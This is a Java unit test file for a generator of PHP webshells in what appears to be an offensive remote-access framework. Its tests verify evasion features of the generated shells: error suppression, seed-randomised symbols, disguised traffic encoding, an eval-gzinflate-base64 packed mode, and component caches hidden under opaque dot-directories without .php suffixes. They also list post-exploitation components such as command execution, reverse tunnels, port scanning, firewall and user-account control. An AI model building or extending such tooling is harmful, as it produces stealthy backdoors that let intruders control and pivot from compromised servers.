package org.leo.phpcore.generator;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.Assumptions;
import org.junit.jupiter.api.io.TempDir;
import org.leo.core.entity.Disguise;
import org.leo.core.generator.GeneratedArtifact;
import org.leo.core.generator.GenerationRequest;
import org.leo.core.runtime.PuppetRuntime;
import org.leo.phpcore.payload.PhpPayloadCodec;

import java.io.ByteArrayOutputStream;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.attribute.FileTime;
import java.util.Base64;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.zip.Inflater;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNotEquals;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

class PhpScriptGeneratorProviderTest {
    private static final String PAYLOAD_KEY = "php-generator-test-key";

    @Test
    void generatesCompatibleMinifiedCompactSourceWithRandomizedCore() throws Exception {
        PhpScriptGeneratorProvider provider = new PhpScriptGeneratorProvider();
        Map<String, Object> options = Map.of("outputMode", "compact", "seed", "fixed-seed",
                "respCode", 202, "headerName", "X-Leo", "headerValue", "token");
        GeneratedArtifact artifact = generate(provider, disguise("request"), disguise("response"), options);
        GeneratedArtifact portable = generate(provider, disguise("request"), disguise("response"),
                Map.of("outputMode", "portable", "seed", "fixed-seed", "respCode", 202,
                        "headerName", "X-Leo", "headerValue", "token"));

        String source = artifact.getContent();
        assertEquals("php", artifact.getFileExtension());
        assertEquals(3, ((Number) artifact.getMetadata().get("protocolVersion")).intValue());
        assertEquals("Envelope", artifact.getMetadata().get("coreProtocol"));
        assertEquals("compact", artifact.getMetadata().get("outputMode"));
        assertEquals("minified-php", artifact.getMetadata().get("bootstrapEncoding"));
        assertEquals("fixed-seed", artifact.getMetadata().get("generationSeed"));
        assertEquals("seed-derived-opaque-v1", artifact.getMetadata().get("cacheLayout"));
        assertTrue(source.startsWith("<?php"));
        assertFalse(source.contains("gzinflate"));
        assertFalse(source.contains("eval("));
        assertTrue(source.contains("http_response_code(202);"));
        assertTrue(source.contains("$_SERVER['HTTP_X_LEO']"));
        assertTrue(source.contains("function leo_traffic_decode($body)"));
        assertTrue(source.contains("leo_payload_decode"));
        assertTrue(source.contains("@error_reporting(0);"));
        assertTrue(source.contains("['componentKey']"));
        assertTrue(source.contains("'PING'"));
        assertTrue(source.contains("'RELAY'"));
        assertTrue(source.contains("'COMPONENT_LOAD'"));
        assertTrue(source.contains("'COMPONENT_INVOKE'"));
        assertFalse(source.contains("phpcore_"));
        assertFalse(source.contains(".pc-"));
        assertFalse(source.contains("*.php"));
        assertFalse(source.contains("{{CACHE_"));
        assertFalse(source.contains("componentDigest"));
        assertFalse(source.contains("hash_file('sha256'"));
        assertFalse(source.contains("hash('sha256'"));
        assertFalse(source.contains("function leo_basic_info"));
        assertFalse(source.contains("{{"));
        assertEquals("on-demand-disk-cache", artifact.getMetadata().get("componentDeliveryMode"));
        assertTrue(((List<?>) artifact.getMetadata().get("components")).contains("ExecCommandComponent"));
        assertTrue(((List<?>) artifact.getMetadata().get("components")).contains("HttpRequestComponent"));
        assertTrue(((List<?>) artifact.getMetadata().get("components")).contains("ProxyForwardComponent"));
        assertTrue(((List<?>) artifact.getMetadata().get("components")).contains("ReverseTunnelComponent"));
        assertTrue(((List<?>) artifact.getMetadata().get("components")).contains("ProcessComponent"));
        assertTrue(((List<?>) artifact.getMetadata().get("components")).contains("NetworkInfoComponent"));
        assertTrue(((List<?>) artifact.getMetadata().get("components")).contains("NetworkConnectionComponent"));
        assertTrue(((List<?>) artifact.getMetadata().get("components")).contains("ScanComponent"));
        assertTrue(((List<?>) artifact.getMetadata().get("components")).contains("ServiceComponent"));
        assertTrue(((List<?>) artifact.getMetadata().get("components")).contains("ScheduledTaskComponent"));
        assertTrue(((List<?>) artifact.getMetadata().get("components")).contains("RegistryComponent"));
        assertTrue(((List<?>) artifact.getMetadata().get("components")).contains("EventLogComponent"));
        assertTrue(((List<?>) artifact.getMetadata().get("components")).contains("FirewallComponent"));
        assertTrue(((List<?>) artifact.getMetadata().get("components")).contains("UserAccountComponent"));
        assertTrue(artifact.getMetadata().get("componentRequirements") instanceof Map<?, ?>);
        Map<?, ?> componentRequirements = (Map<?, ?>) artifact.getMetadata().get("componentRequirements");
        Map<?, ?> databaseRequirements = (Map<?, ?>) componentRequirements.get("DatabaseComponent");
        assertEquals(List.of("PDO"), databaseRequirements.get("classes"));
        assertTrue(((List<?>) databaseRequirements.get("pdoDriversAnyOf"))
                .containsAll(List.of("mysql", "pgsql", "sqlsrv", "dblib", "oci", "sqlite")));
        assertEquals(List.of("ZipArchive"),
                ((Map<?, ?>) componentRequirements.get("CompressComponent")).get("classes"));
        assertEquals(List.of("ZipArchive"),
                ((Map<?, ?>) componentRequirements.get("DecompressComponent")).get("classes"));
        assertEquals(List.of("shell_exec", "exec"),
                ((Map<?, ?>) componentRequirements.get("ProcessComponent")).get("functionsAnyOf"));
        assertEquals(List.of("stream_socket_client"),
                ((Map<?, ?>) componentRequirements.get("ScanComponent")).get("functions"));
        assertEquals(List.of(), artifact.getMetadata().get("bundledComponents"));
        Map<?, ?> requirements = (Map<?, ?>) artifact.getMetadata().get("requirements");
        assertTrue(((List<?>) requirements.get("extensions")).containsAll(List.of("openssl", "zlib")));
        assertTrue(((List<?>) requirements.get("functions")).containsAll(List.of("openssl_encrypt", "gzdecode")));
        assertTrue(source.length() < portable.getContent().length());
        assertTrue(source.length() < 16_000,
                "minimal compact bootstrap regressed in size: " + source.length());
    }

    @Test
    void keepsPreviousDeflateBootstrapAsExplicitPackedMode() throws Exception {
        PhpScriptGeneratorProvider provider = new PhpScriptGeneratorProvider();
        GeneratedArtifact artifact = generate(provider, disguise("request"), disguise("response"),
                Map.of("outputMode", "packed", "seed", "fixed-seed"));

        assertEquals("packed", artifact.getMetadata().get("outputMode"));
        assertEquals("deflate-base64", artifact.getMetadata().get("bootstrapEncoding"));
        assertTrue(artifact.getContent().startsWith("<?php eval(gzinflate(base64_decode('"));
        String expanded = unpack(artifact.getContent());
        assertTrue(expanded.contains("['componentKey']"));
        assertFalse(expanded.contains("phpcore_"));
        Map<?, ?> requirements = (Map<?, ?>) artifact.getMetadata().get("requirements");
        assertTrue(((List<?>) requirements.get("extensions")).contains("zlib"));
        assertTrue(((List<?>) requirements.get("functions")).contains("gzinflate"));
        assertTrue(artifact.getContent().length() < 8_000, "minimal packed bootstrap regressed in size");
    }

    @Test
    void generatesPortableSourceAndMergesBothDisguiseRequirements() throws Exception {
        PhpScriptGeneratorProvider provider = new PhpScriptGeneratorProvider();
        Disguise request = disguise("request");
        request.setRequirements(Map.of("php", Map.of("minVersion", "5.6", "extensions", Set.of("json"))));
        Disguise response = disguise("response");
        response.setRequirements(Map.of("php", Map.of("minVersion", "7.1",
                "extensions", Set.of("openssl"), "functions", Set.of("openssl_encrypt"))));

        GeneratedArtifact artifact = generate(provider, request, response,
                Map.of("outputMode", "portable", "seed", "fixed-seed", "respCode", 200));

        assertEquals("portable", artifact.getMetadata().get("outputMode"));
        assertEquals("plain-php", artifact.getMetadata().get("bootstrapEncoding"));
        assertEquals("7.1", artifact.getMetadata().get("minimumVersion"));
        assertTrue(artifact.getContent().startsWith("<?php"));
        assertFalse(artifact.getContent().contains("gzinflate"));
        assertFalse(artifact.getContent().contains("HTTP_X_LEO"));
        assertFalse(artifact.getContent().contains("phpcore_"));
        assertTrue(artifact.getContent().contains("\n"));
        Map<?, ?> requirements = (Map<?, ?>) artifact.getMetadata().get("requirements");
        assertEquals("7.1", requirements.get("minVersion"));
        assertTrue(((List<?>) requirements.get("extensions")).containsAll(List.of("json", "openssl")));
        assertTrue(((List<?>) requirements.get("functions")).contains("openssl_encrypt"));
        assertTrue(((List<?>) requirements.get("extensions")).contains("zlib"));
    }

    @Test
    void changesInternalSymbolsAcrossGenerationSeeds() throws Exception {
        PhpScriptGeneratorProvider provider = new PhpScriptGeneratorProvider();
        GeneratedArtifact first = generate(provider, disguise("request"), disguise("response"),
                Map.of("outputMode", "compact", "seed", "seed-a"));
        GeneratedArtifact second = generate(provider, disguise("request"), disguise("response"),
                Map.of("outputMode", "compact", "seed", "seed-b"));

        assertNotEquals(first.getContent(), second.getContent());
        assertNotEquals(first.getMetadata().get("variantId"), second.getMetadata().get("variantId"));
    }

    @Test
    void generatedPhpCoreExecutesEnvelopePing(@TempDir Path tempDir) throws Exception {
        Assumptions.assumeTrue(phpAvailable(), "PHP CLI未安装");
        PhpScriptGeneratorProvider provider = new PhpScriptGeneratorProvider();
        GeneratedArtifact artifact = generate(provider, disguise("request"), disguise("response"),
                Map.of("outputMode", "portable", "seed", "envelope-ping"));
        String source = artifact.getContent().replace(
                "file_get_contents('php://input')", "base64_decode($argv[1], true)");
        Path script = tempDir.resolve("envelope.php");
        Files.writeString(script, source, StandardCharsets.UTF_8);
        Map<String, Object> request = Map.of(
                "requestId", "request-php-1",
                "operation", "PING",
                "params", Map.of());
        String wire = Base64.getEncoder().encodeToString(
                Base64.getEncoder().encode(new PhpPayloadCodec(PAYLOAD_KEY).encode(request)));

        Process process = new ProcessBuilder("php", script.toString(), wire)
                .redirectErrorStream(true).start();
        byte[] output = process.getInputStream().readAllBytes();
        assertEquals(0, process.waitFor(), new String(output, StandardCharsets.UTF_8));
        Map<String, Object> response = new PhpPayloadCodec(PAYLOAD_KEY).decode(
                Base64.getDecoder().decode(new String(output, StandardCharsets.UTF_8).trim()));

        assertEquals("request-php-1", response.get("requestId"));
        assertEquals(200, ((Number) response.get("code")).intValue());
        assertTrue(response.get("data") instanceof Map<?, ?>);
        assertTrue(((Map<?, ?>) response.get("data")).containsKey("hostId"));
    }

    @Test
    void generatedPhpCoreReturnsTypedHostMismatch(@TempDir Path tempDir) throws Exception {
        Assumptions.assumeTrue(phpAvailable(), "PHP CLI未安装");
        PhpScriptGeneratorProvider provider = new PhpScriptGeneratorProvider();
        GeneratedArtifact artifact = generate(provider, disguise("request"), disguise("response"),
                Map.of("outputMode", "portable", "seed", "host-mismatch"));
        Path script = tempDir.resolve("host-mismatch.php");
        Files.writeString(script, artifact.getContent().replace(
                "file_get_contents('php://input')", "base64_decode($argv[1], true)"), StandardCharsets.UTF_8);
        Map<String, Object> request = Map.of(
                "requestId", "request-wrong-host",
                "operation", "COMPONENT_INVOKE",
                "hostId", "definitely-not-this-host",
                "component", "MissingComponent",
                "action", "run",
                "params", Map.of());
        String wire = Base64.getEncoder().encodeToString(
                Base64.getEncoder().encode(new PhpPayloadCodec(PAYLOAD_KEY).encode(request)));

        Process process = new ProcessBuilder("php", script.toString(), wire)
                .redirectErrorStream(true).start();
        byte[] output = process.getInputStream().readAllBytes();
        assertEquals(0, process.waitFor(), new String(output, StandardCharsets.UTF_8));
        Map<String, Object> response = new PhpPayloadCodec(PAYLOAD_KEY).decode(
                Base64.getDecoder().decode(new String(output, StandardCharsets.UTF_8).trim()));

        assertEquals(409, ((Number) response.get("code")).intValue());
        assertTrue(response.get("error") instanceof Map<?, ?>);
        Map<?, ?> error = (Map<?, ?>) response.get("error");
        assertEquals("HOST_ID_MISMATCH", error.get("errorCode"));
        assertTrue(error.get("hostId") instanceof String);
    }

    @Test
    void generatedPhpCoreUsesSeedDerivedOpaqueCacheLayout(@TempDir Path tempDir) throws Exception {
        Assumptions.assumeTrue(phpAvailable(), "PHP CLI未安装");
        PhpScriptGeneratorProvider provider = new PhpScriptGeneratorProvider();
        GeneratedArtifact artifact = generate(provider, disguise("request"), disguise("response"),
                Map.of("outputMode", "portable", "seed", "opaque-cache-layout"));
        Path script = tempDir.resolve("endpoint.php");
        Files.writeString(script, artifact.getContent().replace(
                "file_get_contents('php://input')", "base64_decode($argv[1], true)"), StandardCharsets.UTF_8);
        String componentKey = "a".repeat(80);
        String componentSource = "<?php return ['id'=>'FixtureComponent','version'=>'1.0.0',"
                + "'handle'=>function($action,$params){return ['code'=>200];}];";
        Map<String, Object> request = Map.of(
                "requestId", "request-load-1",
                "operation", "COMPONENT_LOAD",
                "component", "FixtureComponent",
                "params", Map.of("componentKey", componentKey, "source", componentSource));
        String wire = Base64.getEncoder().encodeToString(
                Base64.getEncoder().encode(new PhpPayloadCodec(PAYLOAD_KEY).encode(request)));

        Process process = new ProcessBuilder("php", "-d", "sys_temp_dir=" + tempDir,
                script.toString(), wire).redirectErrorStream(true).start();
        byte[] output = process.getInputStream().readAllBytes();
        assertEquals(0, process.waitFor(), new String(output, StandardCharsets.UTF_8));
        Map<String, Object> response = new PhpPayloadCodec(PAYLOAD_KEY).decode(
                Base64.getDecoder().decode(new String(output, StandardCharsets.UTF_8).trim()));
        assertEquals(200, ((Number) response.get("code")).intValue());

        List<Path> cached;
        try (var paths = Files.walk(tempDir)) {
            cached = paths.filter(Files::isRegularFile).filter(path -> !path.equals(script)).toList();
        }
        assertEquals(1, cached.size());
        String directoryName = cached.get(0).getParent().getFileName().toString();
        String fileName = cached.get(0).getFileName().toString();
        assertTrue(directoryName.matches("\\.[a-f0-9]{14}"), directoryName);
        assertTrue(fileName.matches("[a-f0-9]{40}\\.(cache|dat|bin|idx)"), fileName);
        assertFalse(fileName.contains("FixtureComponent"));
        assertFalse(fileName.endsWith(".php"));
    }

    @Test
    void generatedPhpCoreBoundsAndExpiresComponentCache(@TempDir Path tempDir) throws Exception {
        Assumptions.assumeTrue(phpAvailable(), "PHP CLI未安装");
        PhpScriptGeneratorProvider provider = new PhpScriptGeneratorProvider();
        GeneratedArtifact artifact = generate(provider, disguise("request"), disguise("response"),
                Map.of("outputMode", "portable", "seed", "bounded-cache"));
        String source = artifact.getContent().replace("file_get_contents('php://input')", "base64_decode($argv[1], true)");
        Matcher directoryMatcher = Pattern.compile("\\.([a-f0-9]{14})").matcher(source);
        Matcher suffixMatcher = Pattern.compile("\\*\\.([a-z]{3,5})").matcher(source);
        assertTrue(directoryMatcher.find());
        assertTrue(suffixMatcher.find());
        Path cacheDirectory = tempDir.resolve("." + directoryMatcher.group(1));
        Files.createDirectories(cacheDirectory);
        String suffix = suffixMatcher.group(1);
        long oldTime = System.currentTimeMillis() - 8L * 24 * 60 * 60 * 1000;
        for (int index = 0; index < 55; index++) {
            Path cached = cacheDirectory.resolve(String.format("%040x.%s", index, suffix));
            Files.writeString(cached, "<?php return ['id'=>'Fixture" + index
                    + "','handle'=>function($action,$params){return ['code'=>200];}];");
            if (index == 0) Files.setLastModifiedTime(cached, FileTime.fromMillis(oldTime));
        }

        Path script = tempDir.resolve("endpoint.php");
        Files.writeString(script, source, StandardCharsets.UTF_8);
        Map<String, Object> request = Map.of("requestId", "request-cache-sweep",
                "operation", "PING", "params", Map.of());
        String wire = Base64.getEncoder().encodeToString(
                Base64.getEncoder().encode(new PhpPayloadCodec(PAYLOAD_KEY).encode(request)));
        Process process = new ProcessBuilder("php", "-d", "sys_temp_dir=" + tempDir,
                script.toString(), wire).redirectErrorStream(true).start();
        byte[] output = process.getInputStream().readAllBytes();
        assertEquals(0, process.waitFor(), new String(output, StandardCharsets.UTF_8));

        try (var files = Files.list(cacheDirectory)) {
            assertEquals(48, files.filter(Files::isRegularFile).count());
        }
        assertFalse(Files.exists(cacheDirectory.resolve(String.format("%040x.%s", 0, suffix))));
    }

    @Test
    void rejectsUnsupportedOrNonPhpDisguises() {
        Disguise unsupported = disguise("unsupported");
        unsupported.setProtocolVersion(2);
        PhpScriptGeneratorProvider provider = new PhpScriptGeneratorProvider();
        assertThrows(IllegalArgumentException.class, () -> generate(provider, unsupported, disguise("response"), Map.of()));

        Disguise incomplete = disguise("incomplete");
        incomplete.setPhpTrafficEncodeBody(null);
        assertThrows(IllegalArgumentException.class,
                () -> generate(provider, incomplete, disguise("response"), Map.of()));
        assertThrows(IllegalArgumentException.class, () -> generate(provider, disguise("request"),
                disguise("response"), Map.of("outputMode", "unknown")));
        assertThrows(IllegalArgumentException.class, () -> generate(provider, disguise("request"),
                disguise("response"), Map.of("respCode", 204)));
    }

    private GeneratedArtifact generate(PhpScriptGeneratorProvider provider, Disguise request,
                                       Disguise response, Map<String, Object> options) throws Exception {
        Map<String, Object> effective = new java.util.LinkedHashMap<>(options);
        effective.putIfAbsent("payloadKey", "php-generator-test-key");
        return provider.generate(new GenerationRequest(PuppetRuntime.PHP, "webshell", request, response, effective));
    }

    private Disguise disguise(String id) {
        Disguise disguise = new Disguise();
        disguise.setDisguiseId(id);
        disguise.setSchemaVersion(3);
        disguise.setProtocolVersion(3);
        disguise.setSupportedRuntimes(Set.of("php"));
        disguise.setTrafficEncodeBody("public byte[] encodeTraffic(byte[] data){return java.util.Base64.getEncoder().encode(data);}");
        disguise.setTrafficDecodeBody("public byte[] decodeTraffic(byte[] data){return java.util.Base64.getDecoder().decode(data);}");
        disguise.setPhpTrafficEncodeBody("return base64_encode($payload);");
        disguise.setPhpTrafficDecodeBody("$decoded = base64_decode($body, true); if ($decoded === false) throw new InvalidArgumentException('bad traffic'); return $decoded;");
        return disguise;
    }

    private boolean phpAvailable() {
        try {
            return new ProcessBuilder("php", "-v").redirectErrorStream(true).start().waitFor() == 0;
        } catch (Exception ignored) {
            return false;
        }
    }

    private String unpack(String wrapper) throws Exception {
        String marker = "base64_decode('";
        int start = wrapper.indexOf(marker) + marker.length();
        int end = wrapper.indexOf("')));", start);
        byte[] compressed = Base64.getDecoder().decode(wrapper.substring(start, end));
        Inflater inflater = new Inflater(true);
        inflater.setInput(compressed);
        ByteArrayOutputStream output = new ByteArrayOutputStream();
        byte[] buffer = new byte[2048];
        try {
            while (!inflater.finished()) {
                int count = inflater.inflate(buffer);
                if (count <= 0) throw new IllegalStateException("inflate failed");
                output.write(buffer, 0, count);
            }
        } finally {
            inflater.end();
        }
        return output.toString(StandardCharsets.UTF_8);
    }
}
